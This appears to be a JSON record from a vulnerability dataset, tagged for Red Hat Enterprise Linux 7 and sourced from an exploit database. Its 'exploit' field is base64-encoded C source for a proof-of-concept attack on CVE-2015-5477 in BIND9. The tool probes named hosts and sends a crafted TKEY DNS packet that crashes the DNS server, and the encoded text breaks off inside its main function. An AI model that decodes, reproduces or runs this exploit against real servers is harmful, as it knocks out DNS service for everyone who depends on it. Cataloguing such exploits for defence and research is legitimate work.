{
    "cpes": {
        "cpe:/o:redhat:enterprise_linux:7.0:ga:server": {
            "scores": {
                "stride": "000009" 
            }
        }
    }, 
    "source": "exploit-database", 
    "exploit": "LyoNCiAgICBQb0MgZm9yIEJJTkQ5IFRLRVkgYXNzZXJ0IERvcyAoQ1ZFLTIwMTUtNTQ3NykNCg0KICAgIFVzYWdlOg0KICAgICAgICB0a2lsbCA8aG9zdG5hbWU+DQoNCiAgICBXaGF0IGl0IGRvZXM6DQogICAgICAgIC0gRmlyc3Qgc2VuZHMgYSAidmVyc2lvbiIgcXVlcnkgdG8gc2VlIGlmIHRoZSBzZXJ2ZXIgaXMgdXAuDQogICAgICAgIC0gUmVnYXJkbGVzcyBvZiB0aGUgdmVyc2lvbiByZXNwb25zZSwgaXQgdGhlbiBzZW5kcyB0aGUgRG9TIHBhY2tldC4NCiAgICAgICAgLSBUaGVuIGl0IHdhaXRzIDUgc2Vjb25kcyBmb3IgYSByZXNwb25zZS4gSWYgdGhlIHNlcnZlciBjcmFzaGVzLA0KICAgICAgICAgIHRoZXJlIHdpbGwgYmUgbm8gcmVzcG9uc2UuDQoNCiAgICBOb3RlczoNCiAgICAgICAgLSBtdWx0aXBsZSBob3N0bmFtZXMgY2FuIGJlIHNwZWNpZmllZCBvbiB0aGUgY29tbWFuZC1saW5lDQogICAgICAgIC0gSVAgYWRkcmVzc2VzIGNhbiBiZSBzcGVjaWZpZWQgaW5zdGVhZCBvZiBob3N0bmFtZXMNCiAgICAgICAgLSBzdXBwb3J0cyBJUHY0IGFuZCBJUHY2DQogICAgICAgIC0gcnVucyBvbiBMaW51eCwgTWFjLCBhbmQgV2luZG93cyAoY3lnd2luIG9yIFZpc3VhbFN0dWRpbykNCiAgICAgICAgLSBpZiBhIGhvc3RuYW1lIHJlc29sdmVzIHRvIG1vcmUgdGhhbiBvbmUgSVAsIHRoZW4gYWxsIElQcw0KICAgICAgICAgIHdpbGwgYmUgcHJvYmVkDQoNCiAgICBBYm91dCB0aGUgdnVsbjoNCiAgICAgICAgRm9yIGNvbnRyb2wgaW5mb3JtYXRpb24sIHRoZSAiVFNJRyIgZmVhdHVyZSBhbGxvd3MgcGFja2V0cyB0byBiZQ0KICAgICAgICBzaWduZWQgd2l0aCBhIHBhc3N3b3JkLiBUaGlzIGFsbG93cyBzbGF2ZSBzZXJ2ZXJzIHRvIGdldCB1cGRhdGVzDQogICAgICAgIGZyb20gbWFzdGVyIHNlcnZlcnMgd2l0aG91dCBhIE1pdE0gYXR0YWNrIChsaWtlIGZyb20gdGhlIE5TQSkNCiAgICAgICAgY2hhbmdpbmcgdGhlIGRhdGEgb24gdGhlIG5ldHdvcmsuDQoNCiAgICAgICAgQSBwYXNzd29yZCBjYW4gYmUgZGlzdHJpYnV0ZWQgb3V0IG9mIGJhbmQsIHN1Y2ggYXMgU1NIaW5nIGludG8NCiAgICAgICAgYSBib3ggYW5kIGVkaXRpbmcgdGhlIGNvbmZpZ3VyYXRpb24gZmlsZS4gQW50aGVyIHdheSBpcyB0aHJvdWdoDQogICAgICAgIHB1YmxpYy1rZXlzLiBUaGF0J3MgdGhlICJUS0VZIiBmZWF0dXJlOiBpdCBkaXN0cmlidXRlcyBuZXcNCiAgICAgICAgVFNJRyBwYXNzd29yZHMgdXNpbmcgcHVibGljLWtleXMuDQoNCiAgICAgICAgV2hlbiBwcm9jZXNzaW5nIGEgVEtFWSBwYWNrZXQsIHRoZSBjb2RlIHdpbGwgY2FsbCBhIGZ1bmN0aW9uIHRvDQogICAgICAgIGZldGNoIHRoZSBwcm9wZXIgVEtFWSByZWNvcmQuIEl0IGxvb2tzIGluIHR3byBwbGFjZXM6IHRoZQ0KICAgICAgICAiYW5zd2VyIHJlY29yZHMiIHNlY3Rpb24sIGFuZCB0aGUgImFkZGl0aW9uYWwgcmVjb3JkcyIgc2VjdGlvbi4NCiAgICAgICAgSWYgaXQgY2FuJ3QgZmluZCBpdCBpbiB0aGUgImFkZGl0aW9uYWwiLCBpdCBsb29rcyBpbiAiYW5zd2VyIi4NCg0KICAgICAgICBUaGUgbG9va3VwIGZ1bmN0aW9uIHRha2VzIGEgcGFyYW1ldGVyIHRoYXQgaXMgaW5pdGlhbGx5IHNldA0KICAgICAgICB0byBOVUxMLiBEdXJpbmcgdGhlIGZhaWxlZCBsb29rdXAgaW4gdGhlICJhZGRpdGlvbmFsIiBzZWN0aW9uLA0KICAgICAgICBpdCBtYXkgc2V0IHRoYXQgcGFyYW1ldGVyIHRvIGEgbm9uLW51bGwgdmFsdWUuIFNpbmNlIGEgbm9uLW51bGwNCiAgICAgICAgdmFsdWUgaXMgcGFzc2VkIGluIGFnYWluIGR1cmluZyB0aGUgc2Vjb25kIGxvb2t1cCBpbiB0aGUgImFuc3dlciINCiAgICAgICAgc2VjdGlvbiwgdGhlIGNvZGUgY3Jhc2hlcy4NCg0KICAgICAgICBUaGUgcGF0Y2ggd2FzIHRvIHNldCB0aGUgdmFyaWFibGUgdG8gTlVMTCBiZWZvcmUgdGhlIHNlY29uZCBsb29rdXAuDQoNCiAgICAgICAgVGhlIGNvcnJlY3QgZml4IHdvdWxkIHNpbXBseSBub3QgY2hlY2sgdG8gc2VlIGlmIHRoZSBwYXJhbWV0ZXINCiAgICAgICAgd2FzIE5VTEwgdG8gYmUgYmVnaW4gd2l0aC4gSXQncyBhbiBvdXQtb25seSBwYXJhbWV0ZXIsIHNvIGl0J3MgdmFsdWUNCiAgICAgICAgb24gaW5wdXQgZG9lc24ndCBtYXR0ZXIuDQoNCiAgICAgICAgVGhpcyBpcyBhIGp1c3QgYSAiYnJhaW5mYXJ0IiBidWcgdGhhdCBjYW4gb25seSByZXN1bHQgaW4gYSBjcmFzaA0KICAgICAgICBvZiB0aGUgc2VydmVyLiBJdCBjYW5uJ3QgcmVzdWx0IGluIGRhdGEtY29ycnVwdGlvbiBvciBjb2RlDQogICAgICAgIGV4ZWN1dGlvbi4NCg0KICAgIEFib3V0IHRoaXMgY29kZToNCiAgICAgICAgVG8gbGVhcm4gYWJvdXQgd3JpdGluZyBuZXR3b3JrIGNvZGUsIHRoaXMgaXMgcHJvYmFibHkgc29tZXRoaW5nIHVzZWZ1bA0KICAgICAgICB0byBzdHVkeS4NCg0KICAgICAgICBJdCB3b3JrcyBvbiBib3RoIFdpbmRvd3MgYW5kIFVuaXggKExpbnV4LCBNYWMsIGV0Yy4pLiBZb3UgY2FuIHNlZSB3aGVyZQ0KICAgICAgICB0aGUgZGlmZmVyZW5jZXMgYXJlIGJldHdlZW4gdGhlIHR3byBwbGF0Zm9ybXMsIGFzIHdlbGwgYXMgdGhlIHNpbXVsYXJpdGllcy4NCg0KICAgICAgICBJdCB3b3JrcyBvbiBib3RoIElQdjQgYW5kIElQdjYuIEhvd2V2ZXIsIGlmIHlvdSBzZWFyY2ggdGhyb3VnaCB0aGUgY29kZSwNCiAgICAgICAgeW91J2xsIGZpbmQgbm90aGluZyB0aGF0IHNwZWNpZmljYWxseSByZWZlcmVuY2VzIGVpdGhlciB2ZXJzaW9uLiBJdCdzDQogICAgICAgIG1hZ2ljYWxseSBkdWFsLXN0YWNrLiBUaGF0J3MgYmVjYXVzZSBpdCB1c2VzIG5ldyBmdW5jdGlvbnMgbGlrZQ0KICAgICAgICAiZ2V0YWRkcmluZm8oKSIgaW5zdGVhZCBvZiBvbGQgZnVuY3Rpb25zIGxpa2UgImdldGhvc3RieW5hbWUoKSIuDQogICAgICAgIA0KKi8NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPGN0eXBlLmg+DQoNCiNpZmRlZiBXSU4zMg0KI2luY2x1ZGUgPHdpbnNvY2syLmg+DQojaW5jbHVkZSA8d3MydGNwaXAuaD4NCiNwcmFnbWEgY29tbWVudChsaWIsICJXczJfMzIubGliIikNCiNkZWZpbmUgV1NBKGVycikgKFdTQSMjZXJyKQ0KI2RlZmluZSBXU0FFQUdBSU4gV1NBRVRJTUVET1VUDQojZWxzZQ0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxuZXRkYi5oPg0KI2luY2x1ZGUgPGFycGEvaW5ldC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojZGVmaW5lIFdTQUdldExhc3RFcnJvcigpIChlcnJubykNCiNkZWZpbmUgV1NBKGVycikgKGVycikNCiNkZWZpbmUgY2xvc2Vzb2NrZXQoZmQpIGNsb3NlKGZkKQ0KI2VuZGlmDQoNCi8qDQogKiBEb1MgcGFja2V0IHRoYXQgd2lsbCBjcmFzaCBzZXJ2ZXINCiAqLw0Kc3RhdGljIGNvbnN0IHVuc2lnbmVkIGNoYXIgZG9zcGFja2V0W10gPSB7DQogICAgICAgIDB4MDEsIDB4MDIsIC8qIHhpZCAqLw0KICAgICAgICAweDAxLCAweDAwLCAvKiBxdWVyeSAqLw0KICAgICAgICAweDAwLCAweDAxLCAvKiBvbmUgcXVlc3Rpb24gKi8NCiAgICAgICAgMHgwMCwgMHgwMCwgLyogbm8gYW5zd2VyICovDQogICAgICAgIDB4MDAsIDB4MDAsIC8qIG5vIGF1dGhvcml0aWVzICovDQogICAgICAgIDB4MDAsIDB4MDEsIC8qIG9uZSBhZGRpdGlvbmFsOiBtdXN0IGJlICdhZGRpdGlvbmFsJyBzZWN0aW9uIHRvIHdvcmsqLw0KDQogICAgICAgIC8qIFF1ZXJ5IG5hbWUgKi8NCiAgICAgICAgMHgwMywgJ2YnLCAnbycsICdvJywgMHgwMywgJ2InLCAnYScsICdyJywgMHgwMCwNCiAgICAgICAgMHgwMCwgMjQ5LCAvKiBUS0VZIHJlY29yZCB0eXBlICovDQogICAgICAgIDB4MDAsIDI1NSwNCg0KICAgICAgICAvKiBBZGRpdGlvbmFsIHJlY29yZCAgKi8NCiAgICAgICAgMHgwMywgJ2YnLCAnbycsICdvJywgMHgwMywgJ2InLCAnYScsICdyJywgMHgwMCwgLyogbmFtZTogbXVzdCBiZSBzYW1lIGFzIHF1ZXJ5ICovDQogICAgICAgIDB4MDAsIDE2LCAvKiByZWNvcmQgdHlwZTogbXVzdCBOT1QgYmUgMjQ5L1RLRVkgKi8NCiAgICAgICAgMHgwMCwgMjU1LA0KICAgICAgICAwLCAwLCAwLCAwLA0KICAgICAgICAwLCA1MSwNCiAgICAgICAgICAgIDUwLA0KICAgICAgICAgICAgJ2gnLCAndCcsICd0JywgJ3AnLCAncycsICc6JywgJy8nLCAnLycsIA0KICAgICAgICAgICAgJ2cnLCAnaScsICd0JywgJ2gnLCAndScsICdiJywgJy4nLCAnYycsIA0KICAgICAgICAgICAgJ28nLCAnbScsICcvJywgJ3InLCAnbycsICdiJywgJ2UnLCAncicsIA0KICAgICAgICAgICAgJ3QnLCAnZCcsICdhJywgJ3YnLCAnaScsICdkJywgJ2cnLCAncicsIA0KICAgICAgICAgICAgJ2EnLCAnaCcsICdhJywgJ20nLCAnLycsICdjJywgJ3YnLCAnZScsIA0KICAgICAgICAgICAgJy0nLCAnMicsICcwJywgJzEnLCAnNScsICctJywgJzUnLCAnNCcsIA0KICAgICAgICAgICAgJzcnLCAnNycNCn07DQoNCg0KLyoNCiAqIFBhY2tldCBmb3IgcXVlcnlpbmcgdGhlIHZlcnNpb24gb2YgdGhlIHNlcnZlciwgdG8gdGVzdCBpZiBpdCdzIHVwDQogKi8NCnN0YXRpYyBjb25zdCB1bnNpZ25lZCBjaGFyIHZlcnNpb25wYWNrZXRbXSA9IHsNCiAgICAgICAgMHgwMywgMHgwNCwgLyogeGlkICovDQogICAgICAgIDB4MDEsIDB4MDAsIC8qIHF1ZXJ5ICovDQogICAgICAgIDB4MDAsIDB4MDEsIC8qIG9uZSBxdWVzdGlvbiAqLw0KICAgICAgICAweDAwLCAweDAwLCAvKiBubyBhbnN3ZXIgKi8NCiAgICAgICAgMHgwMCwgMHgwMCwgLyogbm8gYXV0aG9yaXRpZXMgKi8NCiAgICAgICAgMHgwMCwgMHgwMCwgLyogbm8gYWRkaXRpb25hbCAqLw0KDQogICAgICAgIC8qIFF1ZXJ5IG5hbWUgKi8NCiAgICAgICAgMHgwNywgJ3YnLCAnZScsICdyJywgJ3MnLCAnaScsICdvJywgJ24nLCAweDA0LCAnYicsICdpJywgJ24nLCAnZCcsIDB4MDAsDQogICAgICAgIDB4MDAsIDE2LCAvKiBUWFQgKi8NCiAgICAgICAgMHgwMCwgMywgICAgLyogQ0hPQVMgKi8NCn07DQoNCg0KLyoNCiAqIFlPTE8gQklORCB2ZXJzaW9uLmJpbmQgcXVlcnkNCiAqLw0KaW50IHF1ZXJ5X3ZlcnNpb24oaW50IGZkLCBjb25zdCBzdHJ1Y3QgYWRkcmluZm8gKnRhcmdldCkNCnsNCiAgICBpbnQgYnl0ZXNfcmVjZWl2ZWQ7DQogICAgaW50IGk7DQogICAgc3RydWN0IHNvY2thZGRyX3N0b3JhZ2UgZnJvbTsNCiAgICBzb2NrbGVuX3Qgc2l6ZW9mX2Zyb20gPSBzaXplb2YoZnJvbSk7DQogICAgY2hhciBob3N0bmFtZVsyNTZdOw0KICAgIHVuc2lnbmVkIGNoYXIgYnVmWzIwNDhdOw0KICAgIGludCByZXN1bHQgPSAwOw0KDQogICAgLyogDQogICAgICogUXVlcnkgdmVyc2lvbiANCiAgICAgKi8NCiAgICBzZW5kdG8oZmQsIChjb25zdCBjaGFyKil2ZXJzaW9ucGFja2V0LCBzaXplb2YodmVyc2lvbnBhY2tldCksIDAsIA0KICAgICAgICAgICAgdGFyZ2V0LT5haV9hZGRyLCB0YXJnZXQtPmFpX2FkZHJsZW4pOw0KDQoNCiAgICAvKiANCiAgICAgKiBnZXQgcmVzcG9uc2UgDQogICAgICovDQphZ2FpbjoNCiAgICBieXRlc19yZWNlaXZlZCA9IHJlY3Zmcm9tKGZkLCAoY2hhciopYnVmLCBzaXplb2YoYnVmKSwgMCwgKHN0cnVjdCBzb2NrYWRkciopJmZyb20sICZzaXplb2ZfZnJvbSk7DQogICAgaWYgKGJ5dGVzX3JlY2VpdmVkIDw9IDAgJiYgV1NBR2V0TGFzdEVycm9yKCkgPT0gV1NBKEVBR0FJTikpIHsNCiAgICAgICAgZnByaW50ZihzdGRlcnIsICJbLV0gdGltZWQgb3V0IGdldHRpbmcgdmVyc2lvbiwgdHJ5aW5nIGFnYWluXG4iKTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfSBlbHNlIGlmIChieXRlc19yZWNlaXZlZCA8PSAwKSB7DQogICAgICAgIGZwcmludGYoc3RkZXJyLCAiWy1dIHVua25vd24gZXJyb3IgcmVjZWl2aW5nIHJlc3BvbnNlOiAldVxuIiwgV1NBR2V0TGFzdEVycm9yKCkpOw0KICAgICAgICByZXR1cm4gMDsNCiAgICB9DQogICAgZ2V0bmFtZWluZm8oKHN0cnVjdCBzb2NrYWRkciopJmZyb20sIHNpemVvZihmcm9tKSwgaG9zdG5hbWUsIHNpemVvZihob3N0bmFtZSksIE5VTEwsIDAsIE5JX05VTUVSSUNIT1NUKTsNCg0KICAgIC8qIA0KICAgICAqIHBhcnNlIHJlc3BvbnNlIA0KICAgICAqLw0KICAgIGlmIChieXRlc19yZWNlaXZlZCA8IDEyKQ0KICAgICAgICBnb3RvIGFnYWluOw0KICAgIGlmIChidWZbMF0gIT0gdmVyc2lvbnBhY2tldFswXSAmJiBidWZbMV0gIT0gdmVyc2lvbnBhY2tldFsxXSkNCiAgICAgICAgZ290byBhZ2FpbjsNCiAgICBpZiAoKGJ1ZlsyXSYweDgwKSAhPSAweDgwKQ0KICAgICAgICBnb3RvIGFnYWluOw0KDQogICAgLyoNCiAgICAgKiBIYW5kbGUgcmVzcG9vbnNlIGNvZGUgDQogICAgICovDQogICAgc3dpdGNoIChidWZbM10mMHgwRikgew0KICAgIGNhc2UgMDoNCiAgICAgICAgLyogcGFyc2UgcGFja2V0IGJlbG93ICovDQogICAgICAgIGJyZWFrOw0KICAgIGNhc2UgMToNCiAgICAgICAgZnByaW50ZihzdGRlcnIsICJbLV0gJXM6IEZPUk1FUlJcbiIsIGhvc3RuYW1lKTsNCiAgICAgICAgcmV0dXJuIDE7DQogICAgY2FzZSAyOg0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlstXSAlczogU1JWRkFJTFxuIiwgaG9zdG5hbWUpOw0KICAgICAgICByZXR1cm4gMTsNCiAgICBjYXNlIDM6DQogICAgICAgIGZwcmludGYoc3RkZXJyLCAiWy1dICVzOiBOQU1FUlJcbiIsIGhvc3RuYW1lKTsNCiAgICAgICAgcmV0dXJuIDE7DQogICAgY2FzZSA0Og0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlstXSAlczogTk9USU1QTFxuIiwgaG9zdG5hbWUpOw0KICAgICAgICByZXR1cm4gMTsNCiAgICBjYXNlIDU6DQogICAgICAgIGZwcmludGYoc3RkZXJyLCAiWy1dICVzOiBSRUZVU0VEXG4iLCBob3N0bmFtZSk7DQogICAgICAgIHJldHVybiAxOw0KICAgIGRlZmF1bHQ6DQogICAgICAgIGZwcmludGYoc3RkZXJyLCAiWy1dICVzOiB1bmtub3duIGVycm9yOiAldVxuIiwgaG9zdG5hbWUsIGJ1ZlszXSk7DQogICAgICAgIHJldHVybiAxOw0KICAgIH0NCg0KDQogICAgaSA9IDEyOyAvKiBza2lwIGhlYWRlciAqLw0KDQogICAgLyogDQogICAgICogc2tpcCBxdWVyeSBuYW1lIA0KICAgICAqLw0KICAgIHdoaWxlIChpIDwgYnl0ZXNfcmVjZWl2ZWQpIHsNCiAgICAgICAgaWYgKGJ1ZltpXSA9PSAwKSB7DQogICAgICAgICAgICBpKys7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgfSBlbHNlIGlmICgoYnVmW2ldICYgMHhDMCkgPT0gMHhDMCkgew0KICAgICAgICAgICAgaSArPSAyOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpICs9IGJ1ZltpXSArIDE7DQogICAgICAgIH0NCiAgICB9DQogICAgaSArPSA0Ow0KDQogICAgLyogDQogICAgICogcHJvY2VzcyBhbGwgYW5zd2VycyANCiAgICAgKi8NCiAgICB3aGlsZSAoaSArIDEyIDw9IGJ5dGVzX3JlY2VpdmVkKSB7DQogICAgICAgIGludCB0LCBjLCBsZW47DQoNCiAgICAgICAgLyogc2tpcCBhbnN3ZXIgbmFtZSAqLw0KICAgICAgICB3aGlsZSAoaSA8IGJ5dGVzX3JlY2VpdmVkKSB7DQogICAgICAgICAgICBpZiAoYnVmW2ldID09IDApIHsNCiAgICAgICAgICAgICAgICBpKys7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9IGVsc2UgaWYgKChidWZbaV0gJiAweEMwKSA9PSAweEMwKSB7DQogICAgICAgICAgICAgICAgaSArPSAyOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBpICs9IGJ1ZltpXSArIDE7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvKiBleHRyYWN0IHJlc291cmNlLXJlY29yZGVyIGhlYWRlciAqLw0KICAgICAgICBpZiAoaSArIDEwID4gYnl0ZXNfcmVjZWl2ZWQpDQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgdCA9IGJ1ZltpKzBdPDw4IHwgYnVmW2krMV07DQogICAgICAgIGMgPSBidWZbaSsyXTw8OCB8IGJ1ZltpKzNdOw0KICAgICAgICBsZW4gPSBidWZbaSs4XTw8OCB8IGJ1ZltpKzldOw0KICAgICAgICBpICs9IDEwOw0KDQogICAgICAgIC8qIHZlcmlmeSBUWFQgQ0hBT1MgKi8NCiAgICAgICAgaWYgKHQgIT0gMTYgfHwgYyAhPSAzKSB7DQogICAgICAgICAgICBpICs9IGxlbjsNCiAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICB9DQoNCiAgICAgICAgLyogZml4IGxlbiAqLw0KICAgICAgICBpZiAobGVuID4gYnl0ZXNfcmVjZWl2ZWQgLSBpKQ0KICAgICAgICAgICAgbGVuID0gYnl0ZXNfcmVjZWl2ZWQgLSBpOw0KDQogICAgICAgIC8qIHByaW50IHRoZSBob3N0bmFtZSAqLw0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlsrXSAlczogIiwgaG9zdG5hbWUpOw0KDQogICAgICAgIC8qIHByaW50IHRoZSBzdHJpbmdzICovDQogICAgICAgIHsNCiAgICAgICAgICAgIGludCBqID0gaTsNCg0KICAgICAgICAgICAgaSArPSBsZW47DQoNCiAgICAgICAgICAgIHdoaWxlIChqIDwgaSkgew0KICAgICAgICAgICAgICAgIGludCBsZW4yID0gYnVmW2pdOw0KICAgICAgICAgICAgICAgIGludCBrOw0KICAgICAgICAgICAgICAgIGorKzsNCiAgICAgICAgICAgICAgICBpZiAobGVuMiA+IGJ5dGVzX3JlY2VpdmVkIC0gbGVuMikNCiAgICAgICAgICAgICAgICAgICAgbGVuMiA9IGJ5dGVzX3JlY2VpdmVkIC0gbGVuMjsNCiAgICAgICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlwiIik7DQoNCiAgICAgICAgICAgICAgICBmb3IgKGs9ajsgazxqK2xlbjI7IGsrKykgew0KICAgICAgICAgICAgICAgICAgICBpZiAoYnVmW2tdID09ICdcXCcpDQogICAgICAgICAgICAgICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlxcIik7DQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKCFpc3ByaW50KGJ1ZltrXSkpDQogICAgICAgICAgICAgICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlxceCUwMngiLCBidWZba10pOw0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIiVjIiwgYnVmW2tdKTsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICBqID0gazsNCg0KICAgICAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiXCIgIik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlxuIik7DQogICAgICAgIH0NCiAgICAgICAgcmVzdWx0ID0gMTsNCiAgICB9DQogICAgcmV0dXJuIHJlc3VsdDsNCn0NCg0KLyoNCiAqIFNlbmQgdGhlIERvUyBwYWNrZXQNCiAqLw0Kdm9pZCBwcm9iZShjb25zdCBzdHJ1Y3QgYWRkcmluZm8gKnRhcmdldCkNCnsNCiAgICBpbnQgZmQ7DQogICAgaW50IHg7DQogICAgaW50IGk7DQogICAgY2hhciBob3N0bmFtZVsyNTZdOw0KICAgIGNoYXIgYnVmWzIwNDhdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9zdG9yYWdlIGZyb207DQogICAgc29ja2xlbl90IHNpemVvZl9mcm9tID0gc2l6ZW9mKGZyb20pOw0KICAgIA0KICAgICAgICANCiAgICAvKg0KICAgICAqIFByaW50IHN0YXR1cw0KICAgICAqLw0KICAgIGdldG5hbWVpbmZvKHRhcmdldC0+YWlfYWRkciwgdGFyZ2V0LT5haV9hZGRybGVuLCBob3N0bmFtZSwgc2l6ZW9mKGhvc3RuYW1lKSwgTlVMTCwgMCwgTklfTlVNRVJJQ0hPU1QpOw0KICAgIGZwcmludGYoc3RkZXJyLCAiWytdICVzOiBQcm9iaW5nLi4uXG4iLCBob3N0bmFtZSk7DQoNCiAgICAvKg0KICAgICAqIENyZWF0ZSBhIHNvY2tldA0KICAgICAqLw0KICAgIGZkID0gc29ja2V0KHRhcmdldC0+YWlfZmFtaWx5LCBTT0NLX0RHUkFNLCAwKTsNCiAgICBpZiAoZmQgPD0gMCkgew0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlstXSBmYWlsZWQ6IHNvY2tldCgpOiAldVxuIiwgV1NBR2V0TGFzdEVycm9yKCkpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLyoNCiAgICAgKiBTZXQgdGhlIHRpbWVvdXQgdG8gNS1zZWNvbmRzDQogICAgICovDQogICAgew0KI2lmZGVmIFdJTjMyDQogICAgICAgIGludCBtaWxsaXNlY29uZHMgPSA1MDAwOw0KICAgICAgICB4ID0gc2V0c29ja29wdChmZCwgU09MX1NPQ0tFVCwgU09fUkNWVElNRU8sIChjaGFyKikmbWlsbGlzZWNvbmRzLCBzaXplb2YobWlsbGlzZWNvbmRzKSk7DQojZWxzZQ0KICAgICAgICBzdHJ1Y3QgdGltZXZhbCB0Ow0KICAgICAgICB0LnR2X3NlYyA9IDU7DQogICAgICAgIHQudHZfdXNlYyA9IDA7DQogICAgICAgIHggPSBzZXRzb2Nrb3B0KGZkLCBTT0xfU09DS0VULCBTT19SQ1ZUSU1FTywgKGNoYXIqKSZ0LCBzaXplb2YodCkpOw0KI2VuZGlmDQoNCiAgICAgICAgaWYgKHggIT0gMCkgew0KICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJbLV0gZXJyIHNldHRpbmcgcmVjdiB0aW1lb3V0OiAldVxuIiwgV1NBR2V0TGFzdEVycm9yKCkpOw0KICAgICAgICB9DQogICAgfQ0KDQoNCiAgICAvKg0KICAgICAqIEZpcnN0LCBxdWVyeSB0aGUgc2VydmVyIHRvIGdyYWIgaXRzIHZlcnNpb24sIGJ1dCBhbHNvIHRvIHNlZSBpdCdzIHVwDQogICAgICovDQogICAgZnByaW50ZihzdGRlcnIsICJbK10gUXVlcnlpbmcgdmVyc2lvbi4uLlxuIik7DQogICAgZm9yIChpPTA7IGk8MzsgaSsrKSB7DQogICAgICAgIGlmIChxdWVyeV92ZXJzaW9uKGZkLCB0YXJnZXQpKQ0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGlmIChpID09IDIpIHsNCiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiWy1dIENhbid0IHF1ZXJ5IHNlcnZlciwgaXMgaXQgY3Jhc2hlZCBhbHJlYWR5P1xuIik7DQogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlstXSBTZW5kaW5nIGV4cGxvaXQgYW55d2F5LlxuIik7DQogICAgICAgIH0NCiAgICB9DQoNCg0KICAgIC8qKioqKioqKioqKioqKioqKg0KICAgICAqIFNFTkQgRG9TIFBBQ0tFVA0KICAgICAqKioqKioqKioqKioqKioqKi8NCiAgICBmcHJpbnRmKHN0ZGVyciwgIlsrXSBTZW5kaW5nIERvUyBwYWNrZXQuLi5cbiIpOw0KICAgIHNlbmR0byhmZCwgKGNvbnN0IGNoYXIqKWRvc3BhY2tldCwgc2l6ZW9mKGRvc3BhY2tldCksIDAsIHRhcmdldC0+YWlfYWRkciwgdGFyZ2V0LT5haV9hZGRybGVuKTsNCg0KICAgIC8qIEdyYWIgcmVzcG9uc2UgKi8NCiAgICBmcHJpbnRmKHN0ZGVyciwgIlsrXSBXYWl0aW5nIDUtc2VjIGZvciByZXNwb25zZS4uLlxuIik7DQogICAgZm9yICg7Oykgew0KICAgICAgICB4ID0gcmVjdmZyb20oZmQsIChjaGFyKilidWYsIHNpemVvZihidWYpLCAwLCAoc3RydWN0IHNvY2thZGRyKikmZnJvbSwgJnNpemVvZl9mcm9tKTsNCiAgICAgICAgaWYgKHggPD0gMCAmJiBXU0FHZXRMYXN0RXJyb3IoKSA9PSBXU0EoRUFHQUlOKSkgew0KICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJbK10gdGltZWQgb3V0LCBwcm9iYWJseSBjcmFzaGVkXG4iKTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9IGVsc2UgaWYgKHggPD0gMCkgew0KICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJbLV0gdW5rbm93biBlcnJvciByZWNlaXZpbmcgcmVzcG9uc2U6ICV1XG4iLCBXU0FHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgICAgICBicmVhazs7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoeCA+IDIgJiYgKGJ1ZlswXSAhPSBkb3NwYWNrZXRbMF0gfHwgYnVmWzFdICE9IGRvc3BhY2tldFsxXSkpDQogICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgDQogICAgICAgIGdldG5hbWVpbmZvKChzdHJ1Y3Qgc29ja2FkZHIqKSZmcm9tLCBzaXplb2YoZnJvbSksIGhvc3RuYW1lLCBzaXplb2YoaG9zdG5hbWUpLCBOVUxMLCAwLCBOSV9OVU1FUklDSE9TVCk7DQogICAgICAgIGZwcmludGYoc3RkZXJyLCAiWy1dICVzOiBnb3QgcmVzcG9uc2UsIHNvIHByb2JhYmx5IG5vdCB2dWxuZXJhYmxlXG4iLCBob3N0bmFtZSk7DQogICAgICAgIGJyZWFrOw0KICAgIH0NCg0KDQogICAgY2xvc2Vzb2NrZXQoZmQpOw0KfQ0KDQoNCi8qDQogKiBUaGUgbWFpbiBmdW5jdGlvbiBqdXN0IHBhcnNlcyB0aGUgYXJndW1lbnRzIGFuZCBsb29rcyB1cCBJUCBhZGRyc3Nlcw0KICogYmVmb3JlIGNhbGxpbmcgdGhlICJwcm9iZSIgZnVuY3Rpb24gdG8gYWN0dWFsbHkgZXhwbG9pdCB0aGUgdGFyZ2V0cw0KICovDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KICAgIGludCBpOw0KDQojaWZkZWYgV0lOMzINCiAgICB7V1NBREFUQSB4OyBXU0FTdGFydHVwKDB4MTAxLCAmeC